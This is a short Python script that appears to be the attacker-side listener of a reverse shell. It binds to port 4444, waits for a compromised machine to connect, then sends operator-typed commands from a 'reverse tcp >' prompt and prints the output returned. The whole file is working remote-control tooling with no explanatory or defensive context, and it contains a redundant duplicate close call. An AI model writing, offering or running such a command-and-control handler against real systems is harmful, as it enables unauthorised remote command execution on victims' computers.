import socket
host = "Server_ip"
port = 4444
buf = 1024
s = socket.socket()
s.bind((host, port))
s.listen(5)
print("[+] Wait For Any Connect... ")
C, addr = s.accept()
print("[+] Connect Done...! ")
while True:
	command = input("reverse tcp > ")
	C.send(command.encode())
	if command.lower() == "exit":
		break
	resu = C.recv(buf).decode()
	print(resu)
C.close()
C.close()
